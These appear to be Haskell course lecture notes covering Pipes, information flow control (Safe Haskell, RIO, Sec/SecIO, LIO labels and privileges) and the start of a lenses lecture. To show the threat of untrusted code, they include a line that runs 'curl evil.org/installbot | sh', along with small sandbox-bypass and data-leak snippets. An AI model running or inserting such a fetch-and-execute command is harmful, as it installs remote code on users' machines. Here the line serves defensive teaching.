   grep str = ???

   main = runEffect (Pipes.stdinLn >-> grep "import" >-> Pipes.stdoutLn)

::

   $ ./grep < grep.hs
   import Pipes
   import qualified Pipes.Prelude as Pipes
   $

Solution #5
===========

.. code:: haskell

   -- grep.hs

   import Data.List (isInfixOf)
   import Pipes
   import qualified Pipes.Prelude as Pipes

   grep :: Monad m => String -> Pipe String String m r
   grep str = Pipes.filter (str `isInfixOf`)

   main = runEffect (Pipes.stdinLn >-> grep "import" >-> Pipes.stdoutLn)


/L12 Information flow control
=============================

Untrusted code
==============

-  Say you want to incorporate untrusted code in a Haskell application

-  Example: Some third-party translation software

   -  You built a web server

   -  Want to add a ‚Äútranslate to Pig Latin‚Äù button to each web page

   -  Download some random code with this function

      .. code:: haskell

         toPigLatin :: L.ByteString -> L.ByteString

-  If you could trust the type (no ``IO``), this would be safe to run

   -  Worst case, users get garbled text on web page

-  However, what if you have?

   .. code:: haskell

      toPigLatin = unsafePerformIO $ do
        system "curl evil.org/installbot | sh"
        return "Ia owna ouya"

.. _safe-haskellsafehaskell:

Safe Haskell
============

http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html

-  Starting with GHC 7.2, ``-XSafe`` option enables `Safe
   Haskell <http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html>`__

   -  Courtesy of our very own CA, David Terei

-  Safe Haskell disallows import of any unsafe modules

   -  E.g., can‚Äôt import ``System.IO.Unsafe``, so can‚Äôt call
      ``unsafePerformIO``

-  Safe imports (enabled by ``-XUnsafe``) require an import to be safe

   .. code:: haskell

      import safe PigLatin (toPigLatin)

   -  The above should guarantee that ``toPigLatin`` doesn‚Äôt call unsafe
      functions

-  But wait‚Ä¶ doesn‚Äôt ``toPigLatin`` use ByteString?

   .. code:: haskell

      head :: {- Lazy -} ByteString -> Word8
      head Empty       = errorEmptyList "head"
      head (Chunk c _) = S.unsafeHead c

      unsafeHead :: {- Strict -} ByteString -> Word8
      unsafeHead (PS x s l) = assert (l > 0) $
          inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s

Safe vs. Trustworthy
====================

-  A module compiled ``-XSafe`` can only import safe modules

   -  As if all imports implicitly have ``safe`` keyword

-  But there are *two* kinds of safe module

   1. Modules verified to be safe by the compiler, compiled ``-XSafe``
   2. Modules asserted to be safe by the author, compiled
      ``-XTrustworthy``

-  So a module like ``Data.ByteString`` can be compiled
   ``-XTrustworthy``

   -  Put unsafe functions in separate ``Data.ByteString.Unsafe`` module
   -  Assert ``Data.ByteString`` ‚Äôs exported symbols cannot be used
      unsafely, even if the module internally makes use of unsafe
      functions

-  Of course, might or might not trust module author

   -  Can specify on a per-package basis whether to honor
      ``-XTrustworthy``
   -  Flag ``-fpackage-trust`` enables such per-package trust
   -  Use flags, ``-trust`` *Pkg*, ``-distrust`` *Pkg*,
      ``-distrust-all-packages``
   -  Can also set default for a package with ``ghc-pkg``

What if untrusted code needs to do IO?
======================================

-  Suppose you want to translate to a real language

   -  Generally requires massive data sets
   -  Untrusted code would at minimum need to do file IO
   -  Or maybe easiest to send text over network to, e.g., Google
      translate

-  Idea: use a *restricted* IO monad, ``RIO``

   -  Untrusted third party implements ``googleTranslate`` function

      .. code:: haskell

         googleTranslate :: Language -> L.ByteString -> RIO L.ByteString

   -  But uses the ``RIO`` monad, instead of ``IO``

   -  Implement ``RIO`` functions to access network, file system

   -  Have functions reject *dangerous* operations

   -  Can use same names and port ``IO`` code to ``RIO`` by manipulating
      imports

Example: hypothetical ``RIO`` monad
===================================

.. code:: haskell

   {-# LANGUAGE Trustworthy #-}
   module RIO (RIO(), runRIO, RIO.readFile) where

   -- Notice that symbol UnsafeRIO is not exported from this module!
   newtype RIO a = UnsafeRIO (IO a)
   runRIO :: RIO a -> IO a
   runRIO (UnsafeRIO io) = io

   instance Monad RIO where ...

   -- Returns True iff access is allowed to file name
   pathOK :: FilePath -> IO Bool
   pathOK file = -- policy, e.g., only allow files in /tmp

   readFile :: FilePath -> RIO String
   readFile file = UnsafeRIO $ do
     ok <- pathOK file
     if ok then Prelude.readFile file else return ""

-  Note use of ``newtype`` ‚Äì ``RIO`` is same as ``IO`` at runtime

   -  Anyone can turn an ``RIO`` action into an ``IO`` one with
      ``runRIO``
   -  But can‚Äôt create ``RIO`` action from ``IO`` without ``UnsafeRIO``

Exercise: implement RIO Monad instance
======================================

.. code:: haskell

   newtype RIO a = UnsafeRIO (IO a)
   runRIO :: RIO a -> IO a
   runRIO (UnsafeRIO io) = io

-  Starter code: ``wget``
   ```cs240h.stanford.edu/RIO.hs`` <http://cs240h.scs.stanford.edu/RIO.hs>`__

::

   GHCi, version 7.8.2: http://www.haskell.org/ghc/  :? for help
   ...
   *RIO> writeFile "/tmp/hello" "Hello, world\n"
   *RIO> runRIO $ RIO.readFile "/tmp/hello"
   "Hello, world\n"
   *RIO> runRIO $ RIO.readFile "/etc/passwd"
   ""
   *RIO> 

-  Bonus: what‚Äôs wrong with the following, alternate definition of
   ``runRIO``?

.. code:: haskell

   newtype RIO a = UnsafeRIO { runRIO :: IO a }

Solutions
=========

.. code:: haskell

   newtype RIO a = UnsafeRIO (IO a)

-  Monad solution:

.. code:: haskell

   instance Monad RIO where
     return = UnsafeRIO . return
     m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k
     fail = UnsafeRIO . fail

-  Bonus solution:

   -  The problem is selectors can be used to *update* state
   -  Exporting ``runRIO`` is tantamount to exporting ``UnsafeRIO``

   .. code:: haskell

      badRIO :: IO a -> RIO a
      badRIO io = (fail "ha ha") { runRIO = io }

   -  Can execute arbitrary ``IO`` actions from within ``RIO``:

   ::

      *Main> runRIO $ badRIO $ putStrLn "gotcha"
      gotcha

Example policies for RIO
========================

-  Only read and write files under some sandbox subdirectory

   -  Protect most of file system from untrusted code

-  Do not allow execution of other programs

   -  Would escape from ``RIO`` restrictions

-  Only allow connections to port 80, and only to known servers

   -  Don‚Äôt want untrusted code sending spam, attacking mysql, etc.

-  Do not allow access to devices

   -  Microphone, camera, speaker, etc.

-  Similar to policies that apply to Java/JavaScript in browser

Why RIO isn‚Äôt enough
====================

-  What if the web site contains private data, such as email?
-  An attack by malicious ``googleTranslate`` function:

   -  Save a copy of private email under ``/sandbox`` (allowed)
   -  When asked to translate a special string, return stored email
   -  Attacker sends himself an email with special string to read stored
      email

-  Another attack

   -  Send query to attacker‚Äôs own website instead of Google

-  Problem: really need to keep track of what information is sensitive

   -  Okay to send public data over network
   -  Not okay to send email (or maybe only okay to send to specific
      Google URL)
   -  Okay to write files, but have to keep track of which files contain
      whose email

-  Solution: Decentralized Information Flow Control (DIFC)

What is DIFC?
=============

|L12image1|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (‚Äúcan flow to‚Äù)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

.. _what-is-difc-1:

What is DIFC?
=============

|L12image2|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (‚Äúcan flow to‚Äù)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

   -  File read? Information flows from file to emacs. System requires
      :math:`L_F\sqsubseteq L_E`.

.. _what-is-difc-2:

What is DIFC?
=============

|L12image3|

-  IFC originated with military applications and classified data
-  Every piece of data in the system has a label
-  Every process/thread has a label
-  Labels are partially ordered by :math:`\sqsubseteq` (‚Äúcan flow to‚Äù)
-  Example: Emacs (labeled :math:`L_E`) accesses file (labeled
   :math:`L_F`)

   -  File read? Information flows from file to emacs. System requires
      :math:`L_F\sqsubseteq L_E`.
   -  File write? Information flows in both directions. System enforces
      that :math:`L_F\sqsubseteq L_E` and :math:`L_E\sqsubseteq L_F`.

Labels are transitive
=====================

|L12image4|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

.. _labels-are-transitive-1:

Labels are transitive
=====================

|L12image5|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Suppose a buggy app reads file (e.g., desktop search)

.. _labels-are-transitive-2:

Labels are transitive
=====================

|L12image6|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Suppose a buggy app reads file (e.g., desktop search)

   -  Process labeled :math:`L_\mathrm{bug}` reads file, so must have
      :math:`L_F\sqsubseteq L_\mathrm{bug}`
   -  But :math:`L_F\sqsubseteq L_\mathrm{bug}\wedge
      L_\mathrm{bug}\sqsubseteq L_\mathrm{net}\Longrightarrow
      L_F\sqsubseteq L_\mathrm{net}`, thus
      :math:`L_\mathrm{bug}\> !\sqsubseteq L_\mathrm{net}`

.. _labels-are-transitive-3:

Labels are transitive
=====================

|L12image7|

-  :math:`\sqsubseteq` is a transitive relation - makes it easier to
   reason about security
-  Example: Label file so it cannot flow to Internet

   -  Policy holds regardless of what other software does

-  Conversely, any app that can write to network cannot read file

Labels form a lattice
=====================

|L12image8|

-  Consider two users, :math:`A` and :math:`B`

   -  Label public data :math:`L_\emptyset`, :math:`A` ‚Äôs private data
      :math:`L_A`, :math:`B` ‚Äôs private data :math:`L_B`

-  What happens if you mix :math:`A` ‚Äôs and :math:`B` ‚Äôs private data
   in a single document?

   -  Both :math:`A` and :math:`B` should be concerned about the release
      of such a document
   -  Need a label at least as restrictive as both :math:`L_A` and
      :math:`L_B`
   -  Use the least upper bound (a.k.a. *join*) of :math:`L_A` and
      :math:`L_B`, written :math:`L_A\sqcup L_B`

**D** IFC is **D** ecentralized
=================================

|L12image9|

-  Every process has a set of privileges
-  Exercising privilege :math:`p` changes label requirements

   -  :math:`L_F\sqsubseteq_p\> L_\mathrm{proc}` to read, and
      additionally :math:`L_\mathrm{proc}\sqsubseteq_p\> L_F` to write
      file
   -  :math:`\sqsubseteq_p` (\``can flow under privileges :math:`p` ‚Äô‚Äô)
      is more permissive than :math:`\sqsubseteq`

-  Idea: Set labels so you know who has relevant privs.

Example privileges
==================

|L12image10|

-  Consider again simple two user lattice
-  Let :math:`a` be user :math:`A` ‚Äôs privileges, :math:`b` be user
   :math:`B` ‚Äôs privileges
-  Clearly :math:`L_A\sqsubseteq_a\>L_\emptyset` and
   :math:`L_B\sqsubseteq_b\>L_\emptyset`

   -  Users should be able to make public or *declassify* their own
      private data

-  Users should also be able to *partially declassify* data

   -  I.e., :math:`L_{AB}\sqsubseteq_a\>L_B` and
      :math:`L_{AB}\sqsubseteq_b\>L_A`

.. _example-privileges-1:

Example privileges
==================

|L12image11|

-  Exercising privileges :math:`a` effectively means:

   -  :math:`L_A` becomes equivalent to :math:`L_\emptyset`
   -  :math:`L_AB` becomes equivalent to :math:`L_B`

The ``Sec`` monad `[Russo]
===========================

- http://www.cse.chalmers.se/~russo/seclib.htm
- http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml

-  Let‚Äôs encode a really simple two-point lattice in Haskell‚Äôs type
   system

   -  Let type ``H`` represent secret (‚Äúhigh‚Äù) data, and ``L`` public
      (‚Äúlow‚Äù) data

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}
      Module Sec where
      data L = Lpriv
      data H = Hpriv

   -  Type represents secrecy level, constructor represents privileges

   .. code:: haskell

      {-# LANGUAGE Trustworthy #-}
      Module Sec.Safe (module Sec) where
      import Sec (L, H, Sec, sec, open, up)

   -  Let‚Äôs also (in module ``Sec``) represent the lattice
      (:math:`L\sqsubseteq H`) in the type system

   .. code:: haskell

      class Flows sl sh where
      instance Flows L L
      instance Flows L H
      instance Flows H H
      -- Notice no instance for Flows H L

The ``Sec`` monad (continued)
=============================

-  Let‚Äôs protect secret values with monads by adding to module ``Sec``

   -  Define two monads, ``Sec H`` for high data, and ``Sec L`` for low
      data

   .. code:: haskell

      newtype Sec s a = MkSec a

      instance Monad (Sec s) where
        return x = MkSec x
        MkSec a >>= k = k a

   -  Allow anyone to label a value, but require privileges to unlabel

   .. code:: haskell

      label :: a -> Sec s a
      label x = MkSec x
      unlabel :: Sec s a -> s -> a
      unlabel (MkSec a) s = s `seq` a     -- s (H or L) acts like key

   -  Notice ``seq`` call, ensures ‚Äú``unlabel undefined secval``‚Äù will
      crash
   -  Allow data to be re-labeled according to :math:`\sqsubseteq`
      relation

   .. code:: haskell

      relabel :: (Flows lin lout) => Sec lin a -> Sec lout a
      relabel (MkSec val) = MkSec val

Applying the ``Sec`` monad
==========================

-  Untrusted code gets access to sensitive data only in ``Sec`` monads
-  Possible policy:

   -  Data labeled ``Sec L`` can be sent over network
   -  Data labeled ``Sec H`` can only be sent to Google
   -  Implement by providing specific trusted functions

   .. code:: haskell

      queryGoogle :: Sec H L.ByteString -> IO (Sec H L.ByteString)
      queryGoogle labeledQuery = do
        let query = unlabel Hpriv labeledQuery  -- code is privileged,
        ...                                     -- so have Hpriv

-  This isn‚Äôt a very satisfying solution

   -  Decision to query google can‚Äôt depend on data
   -  So we aren‚Äôt really getting the full benefit of monads (more like
      ``Applicative``)

``IO`` and ``Sec``
==================

-  What if instead we combined ``Sec`` and ``IO``?

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)

   -  Safe to run this computation?

.. _io-and-sec-1:

``IO`` and ``Sec``
==================

-  What if instead we combined ``Sec`` and ``IO``?

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)

   -  Safe to run this computation? **No!**

   .. code:: haskell

      untrustedTranslate secbs = do
        bs <- secbs
        return $ do writeFile "PublicFile" bs -- oops, pwned
                    {- query Google for translation -}

   -  Let‚Äôs combine ideas of ``RIO`` and ``Sec`` in a ``SecIO`` monad

   .. code:: haskell

      newtype SecIO s a = MkSecIO (IO (Sec s a))
      instance Monad (SecIO s) where
          return x = MkSecIO (return (return x))
          MkSecIO m >>= k = MkSecIO $ do
            MkSec a <- m
            let MkSecIO m' = k a
            m'
      run :: SecIO s a -> IO (Sec s a)
      run (MkSecIO m) = m

The ``SecIO`` monad
===================

-  Allow ``Sec`` value to be accessed within ``SecIO`` monad:

   .. code:: haskell

      value :: Sec s a -> SecIO s a
      value sa = MkSecIO (return sa)

-  Can return high values from ``SecIO L`` by wrapping in ``Sec``:

   .. code:: haskell

      plug :: Less sl sh => SecIO sh a -> SecIO sl (Sec sh a)

.. raw:: html

   <!--
   * What does `SecIO` mean

       ~~~~ {.haskell}
       -- Can write to high files and returns high Int:
       c1 :: SecIO H Int
       -- Can write to low or high files, returns high Int:
       c2 :: SecIO L (Sec H Int)
       -- Can write to low or high files, returns low Int:
       c3 :: SecIO L Int
       ~~~~
   -->

-  How to represent files (similar for ``IORef`` s, etc.)?

   .. code:: haskell

      -- Must encode level of file in type, path of file in value
      type File s = SecFilePath String

      readFileSecIO :: File s -> SecIO s' (Sec s String)
      writeFileSecIO :: File s -> String -> SecIO s ()

.. raw:: html

   <!--
       * Idea extends to other types of resources (e.g., `IORef`s)
       type DataInvariant a = (a -> IO Bool)
       data Loc t s a b = MkLoc t (DataInvariant a) (DataInvariant a)
       type File s = Loc FilePath s String ()
   -->

``SecIO`` translator
====================

-  Still need privileged function

   .. code:: haskell

      queryGoogle :: Sec H L.ByteString -> SecIO H L.ByteString

   -  Represents the fact that Google is trusted with high data
   -  Makes sense you need to implement this to encode policy

-  Now implement untrusted code as follows

   .. code:: haskell

      untrustedTranslate :: Sec H L.ByteString -> SecIO H L.ByteString

   -  Function can invoke ``queryGoogle``, but not send data to other
      places

-  ``SecIO`` does most enforcement at compile time

-  Problem: for email, really want separate labels for every *user*

   -  Users added dynamically, so hard to encode this with ``Flows`` ‚Ä¶

LIO monad `[Stefan]
===========================================================================================

http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf

-  ``cabal install``
   ```lio`` <http://hackage.haskell.org/package/lio>`__

-  Idea: Let‚Äôs keep track of labels *dynamically*, at run time

   -  Track both *current label* and maximum label or *clearance*
   -  Associate an ``LIOState`` with each thread:

   .. code:: haskell

      -- Note type parameter l just specifies the label type
      data LIOState l = LIOState { lioLabel, lioClearance :: !l }

-  Now make ``RIO``-like monad that disallows raw ``IO``

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}

      newtype LIO l a = LIOTCB (IORef (LIOState l) -> IO a)

      instance Monad (LIO l) where
        return = LIOTCB . const . return
        (LIOTCB ma) >>= k = LIOTCB $ \s -> do
          a <- ma s
          case k a of LIOTCB mb -> mb s

   -  So initially, we can‚Äôt do *any* IO within ``RIO`` monad

Backdoors for privileged code
=============================

-  Idea: Trustworthy code wraps IO actions with label checks

-  Need some back doors into IO just for Trustworthy code:

   .. code:: haskell

      {-# LANGUAGE Unsafe #-}

      ioTCB :: IO a -> LIO l a -- back door for privileged code
      ioTCB = LIOTCB . const   -- to execute arbitrary IO actions

-  Also handy to have access to state:

   .. code:: haskell

      getLIOStateTCB :: LIO l (LIOState l)
      getLIOStateTCB = LIOTCB readIORef

      putLIOStateTCB :: LIOState l -> LIO l ()
      putLIOStateTCB s = LIOTCB $ \sp -> writeIORef sp $! s

      modifyLIOStateTCB :: (LIOState l -> LIOState l) -> LIO l ()
      modifyLIOStateTCB = getLIOStateTCB >>= putLIOStateTCB . f

-  Note important convention: symbols ending ‚Ä¶ ``TCB`` never available
   to safe modules

Implementing labels in Haskell
==============================

-  Implementing labels as values is straight-forward:

   .. code:: haskell

      Module LIO.Label

      class (Eq l, Show l, Read l, Typeable l) => Label l where
        lub :: l -> l -> l
        glb :: l -> l -> l
        infixl 5 `lub` `glb`
        canFlowTo :: l -> l -> Bool
        infix 4 `canFlowTo`

-  What about privileges?

   -  Want to know when one privilege subsumes another

   .. code:: haskell

      class (Typeable p, Show p) => SpeaksFor p where
        speaksFor :: p -> p -> Bool

   -  And how privileges affect the :literal:`\`canFlowTo\`` relation

   .. code:: haskell

      class (Label l, SpeaksFor p) => PrivDesc l p where
        downgradeP :: p -> l -> l  -- compute "lowest" equivalent label
        canFlowToP :: p -> l -> l -> Bool
        canFlowToP p l1 l2 = downgradeP p l1 `canFlowTo` l2

Exercise: Implement a ``Label`` instance
========================================

.. code:: haskell

   data Level = Public | Secret | TopSecret
   data Compartment = Nuclear | Crypto
   data MilLabel = MilLabel { level :: Level
                            , compartments :: Set Compartment
                            }

|L12image12|

-  ``wget``
   ```cs240h.stanford.edu/millattice.hs`` <http://cs240h.scs.stanford.edu/millattice.hs>`__
-  Bonus: write some quickcheck properties

Solution
========

-  Label instance

   .. code:: haskell

      instance Label MilLabel where
        lub a b = MilLabel (max (level a) (level b))
                    (Set.union (compartments a) (compartments b))
        glb a b = MilLabel (min (level a) (level b))
                    (Set.intersection (compartments a) (compartments b))
        canFlowTo a b = level a <= level b
                        && compartments a `Set.isSubsetOf` compartments b

-  Some quickcheck instances

   .. code:: haskell

      prop_irreflexive :: MilLabel -> MilLabel -> Bool
      prop_irreflexive l1 l2 =
        if l1 == l2 then l1 `canFlowTo` l2 && l2 `canFlowTo` l1
        else not (l1 `canFlowTo` l2 && l2 `canFlowTo` l1)

      prop_lub :: MilLabel -> MilLabel -> Bool
      prop_lub l1 l2 = l1 `canFlowTo` l3 && l2 `canFlowTo` l3
        where l3 = l1 `lub` l2

Adjusting and checking labels
=============================

-  Before reading any data labeled ``newl``, adjust/check ``LIOState``

   .. code:: haskell

      taint :: Label l => l -> LIO l ()
      taint newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        let l' = l `lub` newl
        unless (l' `canFlowTo` c) $ labelError "taint" [newl]
        modifyLIOStateTCB $ \s -> s { lioLabel = l' }

-  Before writing any data labeled ``newl``, adjust/check ``LIOState``

   .. code:: haskell

      guardWrite :: Label l => l -> LIO l ()
      guardWrite newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        unless (canFlowTo l newl && canFlowTo newl c) $
          labelError "guardWrite" [newl]
        withContext "guardWrite" $ taint newl

Privileges vs. privilege descriptions
=====================================

-  Want to be able to name/examine privileges in any context

-  *Embody* the privileges by wrapping them with in protected
   ``newtype``

   .. code:: haskell

      newtype Priv a = PrivTCB a deriving (Show, Eq, Typeable)

      instance Monoid p => Monoid (Priv p) where
        mempty = PrivTCB mempty
        mappend (PrivTCB m1) (PrivTCB m2) = PrivTCB $ m1 `mappend` m2

      privDesc :: Priv a -> a
      privDesc (PrivTCB a) = a

   -  Given a ``Priv``, can get a description with ``privDesc``, but not
      vice versa

-  How to create privileges in the first place?

   -  Generate them in ``IO`` at start of program, before invoking
      ``LIO``

   .. code:: haskell

      privInit :: p -> IO (Priv p)
      privInit p = return $ PrivTCB p

   -  Remember, if bad guy can execute arbitrary ``IO`` code, game over
      anyway

Using ``Priv`` Objects
======================

-  Many LIO functions have ‚Ä¶ ``P`` variants taking privilege

   -  E.g., replace calls to ``taint`` with ones to ``taintP``:

   .. code:: haskell

      taintP :: PrivDesc l p => Priv p -> l -> LIO l ()
      taintP p newl = do
        LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
        let l' = l `lub` downgradeP p newl
        unless (l' `canFlowTo` c) $ labelErrorP "taintP" p [newl]
        modifyLIOStateTCB $ \s -> s { lioLabel = l' }

-  Can also delegate privileges, wrap them in closures, or check them by
   ‚Äúgating‚Äù closures

   .. code:: haskell

      delegate :: SpeaksFor p => Priv p -> p -> Priv p

      newtype Gate p a = GateTCB (p -> a) deriving Typeable

      gate :: (p -> a) -> Gate p a
      gate = GateTCB

      callGate :: Gate p a -> Priv p -> a
      callGate (GateTCB g) = g . privDesc

Wrapping IO abstractions
========================

-  Many LIO abstractions just LIO ones plus a label

   .. code:: haskell

      data LObj label object = LObjTCB !label !object deriving (Typeable)

-  ``blessTCB`` helper makes constructing LIO functions easy

   -  through the magic of functional dependencies

   .. code:: haskell

      {-# LANGUAGE Trustworthy #-}

      import LIO.TCB.LObj

      type LMVar l a = LObj l (MVar a)

      takeLMVar :: Label l => LMVar l a -> LIO l a
      takeLMVar = blessTCB "takeLMVar" takeMVar

      tryTakeLMVar :: Label l => LMVar l a -> LIO l (Maybe a)
      tryTakeLMVar = blessTCB "tryTakeLMVar" tryTakeMVar

      putLMVar :: Label l => LMVar l a -> a -> LIO l ()
      putLMVar = blessTCB "putLMVar" putMVar

LIO applications
================

-  Main application is `Hails <http://hails.scs.stanford.edu/>`__ web
   framework

   -  Really a framework for creating web *platforms* hosting mutually
      distrustful apps

-  Example: `GitStar <http://gitstar.com/>`__

   -  Host potentially private git repositories
   -  Functionality for, say, syntax-highlighting code cannot exfiltrate
      private sources

-  Ongoing research here at Stanford

.. raw:: html

   <!--

   # Need pure, side-effectful computations

   * Represent labeled pure values with type wrapper

       ~~~~ {.haskell}
       data Labeled l t = LabeledTCB l t
       ~~~~

       * Pure values suitable for mashalling, insertion in database

   * The `LIO l` monad (for `Label l`) is a state monad w. *current* label
       * Current label rises to LUB of all data observed
   * Can label and unlabel pure values in `LIO` monad:

       ~~~~ {.haskell}
       label :: Label l => l -> a -> LIO l (Labeled l a)
       unlabel :: (Label l) => Labeled l a -> LIO l a
       unlabelP :: Priv l p => p -> Labeled l a -> LIO l a
       toLabeled :: (Label l) => l -> LIO l a -> LIO l (Labeled l a)
       ~~~~

       * `label` requires value label to be above current label
       * `unlabel` raises current label to LUB with removed `Labeled`
         (`unlabelP` uses privileges to raise label less)
       * `toLabeled` takes computation that would have raised current
         label, and instead of raising label, wraps result in `Labeled`

   # Other `LIO` features

   * Clearance
       * Special label maintained w. current label in `LIO` state
       * Represents upper bound on current label
       * Can lower clearance to label, but raising requires privileges
       * Allows "need-to-know" policies, reducing danger of covert channels
   * Labeled file system
       * Stores labels along with files
   * Labeled exceptions
       * Can only catch exceptions thrown at points below your clearance
       * Get tainted by exception when you catch it
   * Research in progress to build web framework using `LIO`
       * Allows users to upload untrusted applets into web server

   -->

.. |L12image1| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lintro.svg
.. |L12image2| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lread.svg
.. |L12image3| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/lwrite.svg
.. |L12image4| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans1.svg
.. |L12image5| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans2.svg
.. |L12image6| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans3.svg
.. |L12image7| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/trans4.svg
.. |L12image8| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/ablattice.svg
.. |L12image9| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/decentralized.svg
.. |L12image10| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/ablattice.svg
.. |L12image11| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/aequiv.svg
.. |L12image12| image:: https://www.scs.stanford.edu/14sp-cs240h/slides/millattice.svg


/L13 Lenses
==============

Let‚Äôs talk about well-behaved Haskell programs for a bit.

So well-typed but non-terminating constructs such as the following are
forbidden:

.. code:: haskell

   loop :: Bool
   loop = loop

   wtf :: Bool
   wtf = undefined

   crash :: Bool
   crash = error "fnord"

Back to basics
==============

How many values can we construct from the following type?

.. code:: haskell

   data Bool = False | True

Ordering
========

Another well-known type:

.. code:: haskell

   data Ordering = LT | EQ | GT

Clearly we can construct three different values of this type.

A zero-valued type
==================

In Haskell 2010, we can create types from which *no* values can be
constructed:

.. code:: haskell

   data Empty

This type has no value constructors (and we can‚Äôt use ``deriving``
syntax on it).

‚ÄúWhy?‚Äù you may ask. For programming with types while compiling.

Zero, one, two‚Ä¶
===============

So big deal, we can create types with zero or more constructors:

.. code:: haskell

   data Empty

.. code:: haskell

   data One = One

.. code:: haskell

   data Bool = False | True

Adding some parameters
======================

Given these:

.. code:: haskell

   data Ordering = LT | EQ | GT

   data Bool = False | True

Here‚Äôs another type to ponder.

.. code:: haskell

   data A = A Bool
          | B Ordering

Spend a minute working out how many values this can have. We‚Äôll do a
quick poll.

Abstracting I
=============

Now how many values can this familiar type have?

.. code:: haskell

   (a,b)

Abstracting II
==============

Now how many values can this familiar type have?

.. code:: haskell

   data Either a b = Left a | Right b

Algebra I
=========

Why do we refer to these as *product* types?

.. code:: haskell

   (a,b,c)

   data Product a b c = Product a b c

They can hold a number of values equal to:

:math:`a \times b \times c`

Algebra II
==========

The same holds for the naming of *sum* types:

.. code:: haskell

   data Sum a b c = A a
                  | B b
                  | C c

They can hold a number of values equal to:

:math:`a + b + c`

Working with nested data
========================

Suppose we‚Äôre writing a benchmarking tool. We‚Äôll take criterion as an
example.

Measurements produce noisy samples.

The effect of outliers
======================

We want to understand how outliers in our sample data affect the sample
mean and standard deviation.

.. code:: haskell

   data OutlierEffect
       = Unaffected -- ^ Less than 1% effect.
       | Slight     -- ^ Between 1% and 10%.
       | Moderate   -- ^ Between 10% and 50%.
       | Severe     -- ^ Above 50% (i.e. measurements
                    -- are useless).

Our ``OutlierEffect`` type is embedded in another type that carries
extra information.

.. code:: haskell

   data OutlierVariance = OutlierVariance {
         ovEffect      :: OutlierEffect
       , ovDescription :: String
       , ovFraction    :: Double
       }

More nesting
============

And ``OutlierVariance`` is buried in another type.

.. code:: haskell

   data SampleAnalysis = SampleAnalysis {
         anMean       :: [Double]
       , anStdDev     :: [Double]
       , anOutlierVar :: OutlierVariance
       }

Which is nested in *yet another* type.

.. code:: haskell

   data Payload = Payload {
         sample         :: [Double]
       , sampleAnalysis :: SampleAnalysis
       , outliers       :: Outliers
       }

Accessing data is easy
======================

Even with three levels of nesting, it‚Äôs easy to access an
``OutlierEffect`` given a ``Payload``.

.. code:: haskell

   effect :: Payload -> OutlierEffect
   effect = ovEffect . anOutlierVar . sampleAnalysis

These record accessor functions are handy!

Updates, not so much
====================

OK, so suppose we want to ‚Äú*modify*‚Äù an ``OutlierEffect`` buried in a
``Payload``.

.. code:: haskell

   editEffect :: (OutlierEffect -> OutlierEffect)
              -> Payload -> Payload
   editEffect eff payload =
       payload {
         sampleAnalysis = analysis {
           anOutlierVar = variance {
             ovEffect = eff effect
           }
         }
       }
     where analysis = sampleAnalysis payload
           variance = anOutlierVar analysis
           effect   = ovEffect variance

This is hideous! It hardly even looks like Haskell.

What was this?
==============

We just saw Haskell‚Äôs record update syntax in action.

.. code:: haskell

   setAddrZip :: Zip -> Address -> Address
   setAddrZip zip addr = addr { addrZip = zip }

This notation means:

-  Make a complete copy of the record ``addr``.

-  When copying, set the ``addrZip`` field to ``zip``.

It‚Äôs a way of ‚Äúediting‚Äù a value that leaves the original unchanged, but
doesn‚Äôt require us to specify every field to copy.

It‚Äôs also a very non-composable hack, as we saw.

What we actually want
=====================

Our demands:

1. Access fields within records.

2. Compose *accesses*, so that we can inspect fields within nested
   records.

3. Update fields within records.

4. Compose *updates*, so that we can modify fields within nested
   records.

With Haskell‚Äôs record syntax, we get #1 and #2, sort of #3 (if we
squint), and #4 is hideous.

What to do?
===========

Suppose we have a pair.

.. code:: haskell

   (a,b)

We‚Äôd like to edit its second element.

.. code:: haskell

   editSnd :: (b -> c) -> (a,b) -> (a,c)
   editSnd f (a,b) = (a, f b)

Let‚Äôs refer to the fact that we‚Äôre interested in the second element
*focusing* on it.

It‚Äôs equally easy to edit the first element.

.. code:: haskell

   editFst :: (a -> c) -> (a,b) -> (c,b)
   editFst f (a,b) = (f a, b)

Holes
=====

Let‚Äôs refer to the slot we want to fill when editing a tole as a *hole*.

Here, the hole is in the second position.

.. code:: haskell

   editSnd :: (b -> c) -> (a,b) -> (a,c)
